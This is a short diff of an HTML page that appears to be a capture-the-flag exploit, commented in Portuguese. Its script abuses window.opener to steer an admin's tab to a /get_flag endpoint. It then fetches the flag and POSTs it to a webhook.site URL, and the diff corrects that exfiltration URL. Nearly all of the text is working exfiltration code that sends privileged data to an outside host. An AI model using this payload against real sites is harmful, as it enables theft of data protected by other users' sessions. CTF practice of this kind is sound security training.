@@ -4,18 +4,18 @@
     <title>Redirecting Admin...</title>
   </head>
   <body>
-    <h1>Working on it...</h1>
+    <h1>Sending the flag...</h1>
     <script>
       if (window.opener) {
-        // Redireciona a aba principal do admin para /get_flag
+        // Redireciona a aba original com o cookie de admin
         window.opener.location = "http://34.134.162.213:17001/get_flag";
 
-        // Aguarda e exfiltra a flag desta aba
+        // Depois, pega a flag também nesta aba e exfiltra via webhook
         setTimeout(() => {
           fetch("http://34.134.162.213:17001/get_flag")
             .then(r => r.text())
             .then(flag => {
-              fetch("https://emailhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
+              fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
                 method: "POST",
                 mode: "no-cors",
                 body: flag
